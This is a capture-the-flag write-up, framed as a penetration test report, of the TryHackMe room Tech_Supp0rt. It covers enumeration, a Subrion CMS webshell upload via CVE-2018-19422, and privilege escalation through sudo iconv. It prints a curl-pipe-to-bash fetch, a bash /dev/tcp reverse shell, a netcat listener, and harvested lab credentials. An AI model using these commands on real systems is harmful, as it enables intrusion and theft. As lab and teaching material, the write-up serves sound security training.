# Tech_Supp0rt TryHackMe Room

## Executive Summary

This report documents the penetration testing engagement conducted on the Tech_Supp0rt TryHackMe room, classified as an "Easy" difficulty challenge. The objective was to simulate a real-world penetration test by identifying vulnerabilities, exploiting them to gain initial access, escalating privileges, and obtaining root-level access. The target system was a Linux-based server running Ubuntu, hosting multiple web applications including Apache, WordPress, and Subrion CMS, along with Samba shares.

Key outcomes include:
- Successful enumeration of open ports and services.
- Exploitation of a vulnerable Subrion CMS installation to achieve remote code execution (RCE).
- Privilege escalation from web server user to a standard user, then to root using a misconfigured sudo privilege.
- Retrieval of user and root flags.

The engagement adhered to ethical hacking principles, focusing on reproducibility and detailed documentation for educational purposes.

## Reconnaissance

### Target Identification
- Target IP: 10.201.103.138
- Scope: Full penetration test simulation on the provided IP.

### Port Scanning with Nmap
Initial reconnaissance involved a comprehensive Nmap scan to identify open ports, services, and versions.

**Command:**
```bash
nmap -sC -sV 10.201.103.138 -oN nmap.txt
```

**Output:**
```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-28 09:03 WIB
Nmap scan report for 10.201.103.138
Host is up (0.29s latency).
Not shown: 996 closed tcp ports (reset)
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 10:8a:f5:72:d7:f9:7e:14:a5:c5:4f:9e:97:8b:3d:58 (RSA)
|   256 7f:10:f5:57:41:3c:71:db:b5:5b:db:75:c9:76:30:5c (ECDSA)
|_  256 6b:4c:23:50:6f:36:00:7c:a6:7c:11:73:c1:a8:60:0c (ED25519)
80/tcp  open  http        Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.18 (Ubuntu)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
Service Info: Host: TECHSUPPORT; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: -1h49m59s, deviation: 3h10m30s, median: 0s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time: 
|   date: 2025-10-28T02:04:00
|_  start_date: N/A
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: techsupport
|   NetBIOS computer name: TECHSUPPORT\x00
|   Domain name: \x00
|   FQDN: techsupport
|_  System time: 2025-10-28T07:33:58+05:30

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 28.91 seconds
```

**Analysis:**
- Open ports: 22 (SSH), 80 (HTTP), 139/445 (SMB).
- Services: OpenSSH 7.2p2, Apache 2.4.18, Samba 4.3.11.
- Potential vulnerabilities: Outdated versions (e.g., Samba may have known exploits).

## Enumeration

### Web Directory Enumeration with Feroxbuster
To discover hidden directories and files on the web server.

**Command:**
```bash
feroxbuster -u http://10.201.103.138 -w ~/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-lowercase-2.3-medium.txt
```

**Output (Partial):**
```
Error: error returned from database: (code: 4874) disk I/O error

Caused by:
    (code: 4874) disk I/O error

Location:
    crates/atuin/src/command/client/history.rs:673:18
                                                                                                                                                                                                                                            
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.11.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.201.103.138
 🚀  Threads               │ 50
 📖  Wordlist              │ /home/santstyle/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-lowercase-2.3-medium.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.11.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
403      GET        9l       28w      279c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
404      GET        9l       31w      276c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET       15l       74w     6143c http://10.201.103.138/icons/ubuntu-logo.png
200      GET      375l      968w    11321c http://10.201.103.138/
301      GET        9l       28w      320c http://10.201.103.138/wordpress => http://10.201.103.138/wordpress/
301      GET        9l       28w      315c http://10.201.103.138/test => http://10.201.103.138/test/
```

**Findings:**
- Directories discovered: /wordpress, /test.
- Note: An error occurred with the database, but the scan proceeded.

### SMB Enumeration with smbmap
Enumerating Samba shares for accessible resources.

**Command:**
```bash
smbmap -H 10.201.103.138
```

**Output:**
```
    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(_______)
-----------------------------------------------------------------------------
SMBMap - Samba Share Enumerator v1.10.7 | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 1 SMB connections(s) and 0 authenticated session(s)                                                          
                                                                                                                             
[+] IP: 10.201.103.138:445      Name: 10.201.103.138            Status: NULL Session
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        print$                                                  NO ACCESS       Printer Drivers
        websvr                                                  READ ONLY
        IPC$                                                    NO ACCESS       IPC Service (TechSupport server (Samba, Ubuntu))
```

**Findings:**
- Accessible share: websvr (READ ONLY).

### Accessing SMB Share with smbclient
Connecting to the websvr share to retrieve files.

**Commands:**
```bash
smbclient //10.201.103.138/websvr
# (Prompt for password, leave blank for anonymous)
smb: \> ls
smb: \> get enter.txt
```

**Output:**
```
Password for [WORKGROUP\santstyle]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sat May 29 14:17:38 2021
  ..                                  D        0  Sat May 29 14:03:47 2021
  enter.txt                           N      273  Sat May 29 14:17:38 2021

                8460484 blocks of size 1024. 5673340 blocks available
smb: \> get enter.txt
getting file \enter.txt of size 273 as enter.txt (0.2 KiloBytes/sec) (average 0.2 KiloBytes/sec)
```

**Analysis:**
- Retrieved enter.txt, containing goals and credentials.

### Analyzing enter.txt
Reading the contents of the retrieved file.

**Command:**
```bash
cat enter.txt
```

**Output:**
```
GOALS
=====
1)Make fake popup and host it online on Digital Ocean server
2)Fix subrion site, /subrion doesn't work, edit from panel
3)Edit wordpress website

IMP
===
Subrion creds
|->admin:7sKvntXdPEJaxazce9PXi24zaFrLiKWCk [cooked with magical formula]
Wordpress creds
|->
```

**Findings:**
- Subrion admin credentials: admin:7sKvntXdPEJaxazce9PXi24zaFrLiKWCk (encrypted).
- WordPress credentials: Not provided.

### Decrypting Credentials with CyberChef
Using CyberChef's "Magic" filter to decrypt the Subrion password.

**Input:** 7sKvntXdPEJaxazce9PXi24zaFrLiKWCk
**Output:** Scam2021

**Analysis:**
- Decrypted password: Scam2021.

## Exploitation

### Accessing Subrion CMS Admin Panel
Navigating to the Subrion panel and logging in.

**Steps:**
1. Open browser to http://10.201.103.138/subrion/panel/.
2. Login with: admin / Scam2021.
3. Version identified: Subrion CMS v 4.2.1.

### Exploiting Subrion CMS (CVE-2018-19422)
Using a Python exploit for file upload bypass to RCE.

**Steps:**
1. Download exploit from https://www.exploit-db.com/exploits/49876.
2. Create subrionexploit.py.

**Terminal 1 - Running Exploit:**
```bash
sudo python3 subrionexploit.py -u http://10.201.103.138/subrion/panel/
```

**Output:**
```
[+] SubrionCMS 4.2.1 - File Upload Bypass to RCE - CVE-2018-19422 

[+] Trying to connect to: http://10.201.103.138/subrion/panel/
[+] Success!
[+] Got CSRF token: mH42jkt9yvotiSvVjsnf3KeGbDJVXajclSXdedHf
[+] Trying to log in...
[+] Login Successful!

[+] Generating random name for Webshell...
[+] Generated webshell name: blmumapteswrfsz

[+] Trying to Upload Webshell..
[+] Upload Success... Webshell path: http://10.201.103.138/subrion/panel/uploads/blmumapteswrfsz.phar 

$ curl 10.9.1.159:8080/hack.sh |bash
```

**Terminal 2 - Creating Payload:**
```bash
vim hack.sh
#!/bin/bash
bash -i >& /dev/tcp/10.9.1.159/4444 0>&1
```

**Terminal 3 - Serving Payload:**
```bash
python3 -m http.server 8080
```

**Terminal 4 - Listening for Shell:**
```bash
nc -lvnp 4444
```

**Output (Shell):**
```
listening on [any] 4444 ...
connect to [10.9.1.159] from (UNKNOWN) [10.201.103.138] 35250
bash: cannot set terminal process group (1378): Inappropriate ioctl for device
bash: no job control in this shell
www-data@TechSupport:/var/www/html/subrion/uploads$
```

**Analysis:**
- Gained reverse shell as www-data.

## Post-Exploitation

### Exploring the System
Navigating directories and identifying users.

**Commands:**
```bash
cd ..
cd /home
ls -la
cd scamsite
ls -la
```

**Output:**
```
www-data@TechSupport:/var/www/html/subrion/uploads$ cd ..
www-data@TechSupport:/var/www/html/subrion$ cd /home
www-data@TechSupport:/home$ ls -la
total 12
drwxr-xr-x  3 root     root     4096 May 28  2021 .
drwxr-xr-x 23 root     root     4096 May 28  2021 ..
drwxr-xr-x  4 scamsite scamsite 4096 May 29  2021 scamsite
www-data@TechSupport:/home$ cd scamsite
www-data@TechSupport:/home/scamsite$ ls -la
total 32
drwxr-xr-x 4 scamsite scamsite 4096 May 29  2021 .
drwxr-xr-x 3 root     root     4096 May 28  2021 ..
-rw------- 1 scamsite scamsite  151 May 28  2021 .bash_history
-rw-r--r-- 1 scamsite scamsite  220 May 28  2021 .bash_logout
-rw-r--r-- 1 scamsite scamsite 3771 May 28  2021 .bashrc
drwx------ 2 scamsite scamsite 4096 May 28  2021 .cache
-rw-r--r-- 1 scamsite scamsite  655 May 28  2021 .profile
-rw-r--r-- 1 scamsite scamsite    0 May 28  2021 .sudo_as_admin_successful
drwxr-xr-x 2 root     root     4096 May 29  2021 websvr
```

**Findings:**
- User: scamsite.

### Accessing WordPress Configuration
Reading wp-config.php for database credentials.

**Commands:**
```bash
cd /var/www/html/wordpress
ls
cat wp-config.php
```

**Output (wp-config.php):**
```
<?php
/**
 * The base configuration for WordPress
 *
 * The wp-config.php creation script uses this file during the
 * installation. You don't have to use the web site, you can
 * copy this file to "wp-config.php" and fill in the values.
 *
 * This file contains the following configurations:
 *
 * * MySQL settings
 * * Secret keys
 * * Database table prefix
 * * ABSPATH
 *
 * @link https://wordpress.org/support/article/editing-wp-config-php/
 *
 * @package WordPress
 */

// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME', 'wpdb' );

/** MySQL database username */
define( 'DB_USER', 'support' );

/** MySQL database password */
define( 'DB_PASSWORD', 'ImAScammerLOL!123!' );

/** MySQL hostname */
define( 'DB_HOST', 'localhost' );

/** Database Charset to use in creating database tables. */
define( 'DB_CHARSET', 'utf8' );

/** The Database Collate type. Don't change this if in doubt. */
define( 'DB_COLLATE', '' );

/**#@+
 * Authentication Unique Keys and Salts.
 *
 * Change these to different unique phrases!
 * You can generate these using the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}
 * You can change these at any point in time to invalidate all existing cookies. This will force all users to have to log in again.
 *
 * @since 2.6.0
 */
define( 'AUTH_KEY',         'put your unique phrase here' );
define( 'SECURE_AUTH_KEY',  'put your unique phrase here' );
define( 'LOGGED_IN_KEY',    'put your unique phrase here' );
define( 'NONCE_KEY',        'put your unique phrase here' );
define( 'AUTH_SALT',        'put your unique phrase here' );
define( 'SECURE_AUTH_SALT', 'put your unique phrase here' );
define( 'LOGGED_IN_SALT',   'put your unique phrase here' );
define( 'NONCE_SALT',       'put your unique phrase here' );

/**#@-*/

/**
 * WordPress Database Table prefix.
 *
 * You can have multiple installations in one database if you give each
 * a unique prefix. Only numbers, letters, and underscores please!
 */
$table_prefix = 'wp_';

/**
 * For developers: WordPress debugging mode.
 *
 * Change this to true to enable the display of notices during development.
 * It is strongly recommended that plugin and theme developers use WP_DEBUG
 * in their development environments.
 *
 * For information on other constants that can be used for debugging,
 * visit the documentation.
 *
 * @link https://wordpress.org/support/article/debugging-in-wordpress/
 */
define( 'WP_DEBUG', false );

/* That's all, stop editing! Happy publishing. */

/** Absolute path to the WordPress directory. */
if ( ! defined( 'ABSPATH' ) ) {
        define( 'ABSPATH', __DIR__ . '/wordpress/' );
}

define('WP_HOME', '/wordpress/index.php');
define('WP_SITEURL', '/wordpress/');

/** Sets up WordPress vars and included files. */
require_once ABSPATH . 'wp-settings.php';
```

**Findings:**
- WordPress DB password: ImAScammerLOL!123! (likely scamsite password).

## Privilege Escalation

### Switching to scamsite User
Using the discovered password to switch users.

**Commands:**
```bash
python -c 'import pty; pty.spawn("/bin/sh")'
su scamsite
Password: ImAScammerLOL!123!
```

### Identifying SUID Binaries
Searching for SUID binaries for potential escalation.

**Command:**
```bash
find / -user root -perm -4000 -print 2>/dev/null
```

**Output:**
```
/bin/umount
/bin/ping6
/bin/su
/bin/fusermount
/bin/mount
/bin/ping
/usr/bin/newuidmap
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/sudo
/usr/bin/pkexec
/usr/bin/gpasswd
/usr/bin/newgidmap
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/snapd/snap-confine
/sbin/mount.cifs
```

### Checking sudo Privileges
Verifying allowed sudo commands.

**Command:**
```bash
sudo -l
```

**Output:**
```
Matching Defaults entries for scamsite on TechSupport:                                                                       
    env_reset, mail_badpass,                                                                                                 
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User scamsite may run the following commands on TechSupport:
    (ALL) NOPASSWD: /usr/bin/iconv
```

**Analysis:**
- Misconfigured sudo: Allows running iconv as root without password.

### Exploiting iconv for Root Access
Using iconv to read /root/root.txt.

**Command:**
```bash
sudo -u root iconv -f 8859_1 -t 8859_1 "/root/root.txt"
```

**Output:**
```
851b8233a8c09400ec30651bd1529bf1ed02790b  -
```

**Analysis:**
- Root flag obtained.

## Findings

1. **Vulnerable Subrion CMS (CVE-2018-19422)**: Allowed file upload bypass leading to RCE.
2. **Weak SMB Configuration**: Anonymous access to shares containing sensitive information.
3. **Exposed Credentials**: Plaintext and encrypted credentials in SMB share.
4. **Misconfigured sudo**: Allowed privilege escalation via iconv.
5. **Outdated Software**: Apache, Samba, and OpenSSH versions may have additional vulnerabilities.

## Recommendations

1. **Patch Management**: Regularly update all software to the latest versions.
2. **Access Controls**: Restrict SMB shares and implement authentication.
3. **Credential Security**: Avoid storing credentials in accessible locations; use encryption and vaults.
4. **Sudo Hardening**: Limit sudo privileges to necessary commands only.
5. **Web Application Security**: Regularly audit CMS installations for vulnerabilities.
6. **Monitoring**: Implement logging and alerting for suspicious activities.

This report provides a complete, reproducible walkthrough of the penetration test. All flags were captured successfully.
